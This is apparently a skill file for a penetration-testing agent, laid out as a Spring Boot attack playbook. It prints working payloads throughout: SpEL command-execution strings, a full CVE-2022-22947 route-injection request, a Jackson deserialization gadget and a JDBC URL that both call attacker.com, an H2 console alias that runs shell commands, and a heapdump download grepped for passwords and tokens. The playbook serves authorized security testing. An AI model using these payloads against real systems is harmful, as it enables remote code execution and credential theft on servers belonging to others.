---
name: spring-boot
description: Security testing playbook for Spring Boot applications covering actuator exposure, SpEL injection, and deserialization attacks
---

# Spring Boot

Security testing for Spring Boot applications. Focus on Actuator endpoint exposure, Spring Expression Language injection, Java deserialization, Spring Security filter chain bypass, and JDBC connection string injection.

## Attack Surface

**Core Components**
- Controllers: `@RestController`, `@Controller`, `@RequestMapping`, path matching (AntPathMatcher vs PathPatternParser)
- Spring Security: filter chain, `SecurityFilterChain` beans, `WebSecurityConfigurerAdapter` (legacy), method security
- Spring MVC: `HandlerInterceptor`, `@ControllerAdvice`, `@ExceptionHandler`, content negotiation

**Actuator**
- Management endpoints: `/actuator/*` — health, env, beans, mappings, heapdump, threaddump, loggers, jolokia
- Custom endpoints via `@Endpoint`, management port separation (`management.server.port`)

**Data Handling**
- Spring Data JPA: repositories, `@Query`, JPQL, native queries, specifications
- Spring Data REST: auto-exposed repositories, HAL browser, projections
- Jackson: deserialization, polymorphic types, `@JsonTypeInfo`, default typing

**Deployment**
- Embedded Tomcat/Jetty/Undertow, WAR deployment, Docker, Kubernetes

## High-Value Targets

- Actuator endpoints: `/actuator/env`, `/actuator/heapdump`, `/actuator/jolokia`, `/actuator/gateway/routes`
- Spring Data REST auto-exposed repositories (`/api/users`, `/api/orders`)
- H2 console (`/h2-console`) — enables SQL and arbitrary code execution
- Swagger/OpenAPI endpoints (`/swagger-ui.html`, `/v3/api-docs`, `/v2/api-docs`)
- Spring Cloud Gateway routes and filters
- OAuth2/OIDC endpoints (`/oauth/authorize`, `/oauth/token`)

## Reconnaissance

**Actuator Probing**
```
GET /actuator
GET /actuator/env
GET /actuator/mappings
GET /actuator/beans
GET /actuator/heapdump
GET /actuator/jolokia
GET /actuator/gateway/routes
GET /manage/env          (custom management path)
```

**Path Variations for Bypass**
```
/actuator;/env           (Tomcat path parameter bypass)
/actuator/..;/env        (path traversal via semicolon)
/%61ctuator/env          (URL encoding)
/env                     (legacy path without prefix)
```

**Application Mapping**
- `/actuator/mappings` lists all request mappings with handler methods and conditions
- `/actuator/beans` reveals all Spring beans, including security configurations
- `/actuator/configprops` exposes configuration properties (may contain sanitized secrets)

## Key Vulnerabilities

### Actuator Endpoint Exposure

**Environment Disclosure**: `GET /actuator/env` reveals database URLs, credentials (may be masked), API keys, `spring.datasource.*`.

**Credential Recovery**: Masked properties can sometimes be recovered via `POST /actuator/env` with `{"name":"spring.datasource.password","value":""}` or heapdump analysis.

**Heapdump Exploitation**
```bash
curl -o heapdump.hprof http://target/actuator/heapdump
strings heapdump.hprof | grep -i "password\|secret\|key\|token"
```

**Jolokia RCE**: `POST /actuator/jolokia` with MBean exec to reload Logback config from attacker URL.

### SpEL Injection

**Common Injection Points**
```java
ExpressionParser parser = new SpelExpressionParser();
parser.parseExpression(userInput).getValue();  // Direct user input in SpEL

@Query("SELECT u FROM User u WHERE u.name = ?#{#name}")  // Spring Data @Query
```

**RCE Payloads**
```
${T(java.lang.Runtime).getRuntime().exec('whoami')}
${new java.lang.ProcessBuilder(new java.lang.String[]{'whoami'}).start()}
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream())}
```

**Spring Cloud Gateway SpEL (CVE-2022-22947)**
```
POST /actuator/gateway/routes/hacktest
{"id":"hacktest","filters":[{"name":"AddResponseHeader","args":{"name":"Result","value":"#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream()))}"}}],"uri":"http://example.com"}

POST /actuator/gateway/refresh
```

### Java Deserialization

**Attack Vectors**
- Unprotected `ObjectInputStream.readObject()` on user-controlled data
- Jackson `enableDefaultTyping()` or `@JsonTypeInfo(use=Id.CLASS)` with polymorphic deserialization
- Spring HTTP invoker, RMI endpoints, JMX over HTTP

**Gadget Chains**: Check classpath for Commons Collections, Commons Beanutils, Spring Core, Hibernate, Groovy.

**Jackson Polymorphic Deserialization**
```json
["com.sun.rowset.JdbcRowSetImpl", {"dataSourceName":"ldap://attacker.com/Exploit","autoCommit":true}]
```

### Spring Security Filter Chain Bypass

**Path Matching Exploits**
```
/admin/panel     -> secured
/admin/panel/    -> may bypass (trailing slash)
/admin/panel;    -> Tomcat ignores after semicolon
/admin/./panel   -> path normalization difference
/ADMIN/PANEL     -> case sensitivity mismatch
```

**Method Security Bypass**
- `@PreAuthorize` and `@Secured` only apply through Spring proxy (not internal calls)
- `@PostAuthorize` runs method before authorization check (side effects already occurred)
- Missing `@EnableMethodSecurity` disables all method security annotations silently

### JDBC Connection String Injection

**Via Actuator env**
```
POST /actuator/env
{"name":"spring.datasource.url","value":"jdbc:mysql://attacker.com:3306/db?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor"}

POST /actuator/restart
```

**Driver-Specific**: MySQL `autoDeserialize` for RCE, PostgreSQL `socketFactory` for SSRF, H2 `INIT=RUNSCRIPT` for SQL execution.

### Spring Data REST

- All `@RepositoryRestResource` and `CrudRepository` beans auto-exposed as REST endpoints
- PATCH/PUT for mass assignment: `PATCH /api/users/1 {"role":"ADMIN"}`
- Projection abuse exposing sensitive related entities
- HAL browser (`/api/browser/`) providing full API exploration

### H2 Console Exploitation

```sql
-- Access at /h2-console, default: sa / (empty password)
CREATE ALIAS SHELLEXEC AS 'String shellexec(String cmd) throws Exception { return new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next(); }';
CALL SHELLEXEC('whoami');
```

## Bypass Techniques

- Semicolon path parameters: `/admin;/panel` — Tomcat strips after semicolon, Spring Security may not
- Double URL encoding: `%252e%252e%252f` bypassing WAF and first-layer decoding
- HTTP method override: `X-HTTP-Method-Override`, `_method` parameter
- Content negotiation: `.json`, `.xml` suffixes triggering different handlers
- Internal forwards bypassing security filters applied to original path

## Testing Methodology

1. **Actuator scan** - Probe all actuator endpoints with path variations (semicolon, encoding, alternate prefixes)
2. **Heapdump analysis** - Download and analyze for credentials, tokens, secrets, internal URLs
3. **SpEL injection** - Test all user inputs flowing into SpEL contexts (error messages, search, validation)
4. **Deserialization** - Identify serialization endpoints, check Jackson default typing, test with ysoserial
5. **Filter chain audit** - Map security rules, test path matching discrepancies, method security proxy bypass
6. **Spring Data REST** - Enumerate auto-exposed repositories, test CRUD operations, check projections
7. **JDBC injection** - Via actuator env modification, test driver-specific exploitation chains

## Validation Requirements

- Actuator data exposure with extracted credentials or secrets (from env, heapdump, configprops)
- SpEL injection proof with command output
- Deserialization RCE with out-of-band callback or command output
- Security filter bypass showing access to protected endpoints via path manipulation
- JDBC connection string injection with out-of-band interaction proof
- Spring Data REST mass assignment modifying privileged fields

## False Positives

- Actuator endpoints returning 404 or empty results (properly restricted)
- SpEL syntax in error messages that is display-only, not evaluated from user input
- Jackson without `enableDefaultTyping()` — polymorphic payloads will fail
- Semicolon path bypass on non-Tomcat servers (Jetty, Undertow handle differently)
- `/actuator/env` showing masked `******` values without a recovery path

## Impact

- Actuator exposure: credential theft, infrastructure mapping, RCE via Jolokia/heapdump
- SpEL injection: remote code execution with application privileges
- Java deserialization: remote code execution, full server compromise
- Filter chain bypass: authentication bypass, unauthorized data access
- JDBC injection: database credential theft, RCE via driver-specific gadgets

## Pro Tips

- `/actuator/heapdump` is often the highest-impact single finding: it contains every secret in JVM memory
- Semicolon trick (`/path;/bypass`) is Tomcat-specific — always verify the servlet container first
- `management.endpoints.web.exposure.include=*` is a common misconfiguration exposing all actuator endpoints
- Check `/actuator/gateway/routes` on Spring Cloud Gateway for route injection (CVE-2022-22947)
- Spring Data REST `@RepositoryRestResource(exported=false)` still creates the bean — verify via `/actuator/beans`
- Method security annotations are no-ops without `@EnableMethodSecurity` on a `@Configuration` class
- H2 console at `/h2-console` with default credentials provides SQL and arbitrary code execution

## Summary

Spring Boot security testing prioritizes Actuator endpoint exposure (especially `/env`, `/heapdump`, `/jolokia`), SpEL injection in expression evaluation contexts, and Java deserialization through Jackson polymorphic typing or direct ObjectInputStream usage. Spring Security filter chain bypass via path matching discrepancies (semicolons, trailing slashes, encoding) is a reliable attack vector on Tomcat deployments. JDBC connection string injection via Actuator env manipulation enables RCE through driver-specific gadgets. Always analyze heapdumps for credentials, test all path variations against security rules, and verify method security annotations are actually enabled.
